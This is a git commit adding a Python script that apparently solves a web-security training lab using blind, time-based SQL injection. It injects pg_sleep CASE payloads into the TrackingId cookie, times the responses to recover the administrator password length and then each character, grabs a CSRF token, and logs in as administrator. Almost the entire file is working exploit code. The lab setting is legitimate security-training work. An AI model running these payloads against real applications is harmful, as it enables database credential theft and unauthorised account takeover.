62aa7286e488d27ac48ae0900053994b08ad4913
Alvin Nguyen <alvinonguyen00@gmail.com>
2023-12-22 17:53:39 -0800

    SQL Injection Labs 14 and 15

---
+++ sql-injection/15-lab-time-delays-info-retrieval.py
@@ -0,0 +1,156 @@
+from bs4 import BeautifulSoup
+from urllib.parse import urlencode, urljoin
+
+import argparse
+import requests
+import urllib3
+import string
+import time
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("url")
+    parser.add_argument("-x", "--use-proxy", action="store_true")
+    return parser.parse_args()
+
+
+def print_info(string, end="\n"):
+    print(f"\r\033[1;94m[*]\033[00m {string}", end=end)
+
+
+def print_success(string, end="\n"):
+    print(f"\r\033[1;92m[+]\033[00m {string}", end=end)
+
+
+def print_fail(string):
+    print(f"\r\033[1;91m[-]\033[00m {string}")
+    exit(1)
+
+
+def verify_lab_accessible(url):
+    print_info("Checking if given URL is accessible...")
+    resp = requests.get(url)
+    if resp.status_code != 504:
+        print_success("URL is accessible.\n")
+    else:
+        print_fail("URL is inaccessible. Reopen the lab and use new URL.")
+
+
+def verify_lab_solved(url):
+    print_info("Revisiting URL to verify if attack was successful...")
+    resp = requests.get(url)
+    soup = BeautifulSoup(resp.text, "html.parser")
+    if soup.select_one("#notification-labsolved"):
+        print_success("Attack successful. Lab solved.")
+    else:
+        print_fail("Lab unsolved. Ensure...")
+
+
+def solve_lab(url, proxies):
+    print_info(
+        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
+    )
+    print(
+        '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
+    )
+
+    len_pass = 1
+    while True:
+        cookies = {
+            "TrackingId": f"' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
+        }
+        
+        start = time.perf_counter()
+        requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+        end = time.perf_counter()
+        response_time = end - start
+
+        if response_time < 10:
+            print_info(f"{len_pass} => {response_time:.2f} seconds", end="")
+            len_pass += 1
+        else:
+            print_success(f"{len_pass} => {response_time:.2f} seconds\n")
+            break
+
+    print_info(
+        f'Determining administrator password by visting "{url}" with the following cookies:'
+    )
+    print(
+        '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
+    )
+    alphabet = string.ascii_letters + string.digits + string.punctuation
+    password = ""
+
+    for i in range(len_pass):
+        for c in alphabet:
+            cookies = {
+                "TrackingId": f"' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN pg_sleep(10) ELSE pg_sleep(0) END --"
+            }
+            start = time.perf_counter()
+            requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+            end = time.perf_counter()
+            response_time = end - start
+
+            if response_time < 10:
+                print_info(f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...", end="")
+            else:
+                print_success(
+                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}...",
+                    end="",
+                )
+                password += c
+                break
+        else:
+            print()
+            print_fail(f"Unable to determine character at index {i}")
+
+    print()
+    print_success(f"Successfully extracted administrator password: {password}\n")
+
+    url = urljoin(url, "/login")
+    print_info(f'Grabbing CSRF value from "{url}"...')
+
+    s = requests.session()
+    resp = s.get(url, proxies=proxies, verify=False)
+    soup = BeautifulSoup(resp.text, "html.parser")
+    csrf = soup.select_one('input[name="csrf"]').get("value")
+
+    if csrf is None:
+        print_fail("Unable to grab CSRF value.")
+
+    else:
+        print_success(f"CSRF value: {csrf}\n")
+
+    data = {"csrf": csrf, "username": "administrator", "password": password}
+    print_info("Logging in with the following values:")
+    print(data)
+
+    resp = s.post(
+        url,
+        proxies=proxies,
+        verify=False,
+        data=data,
+    )
+    print_success("SQL injection attack performed.\n")
+
+
+def main():
+    args = get_args()
+    root_url = urljoin(args.url, "/")
+
+    verify_lab_accessible(root_url)
+
+    proxies = None
+    if args.use_proxy:
+        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
+        print_info('Using "http://127.0.0.1:8080" as a proxy')
+
+    solve_lab(root_url, proxies)
+    verify_lab_solved(root_url)
+
+
+if __name__ == "__main__":
+    main()
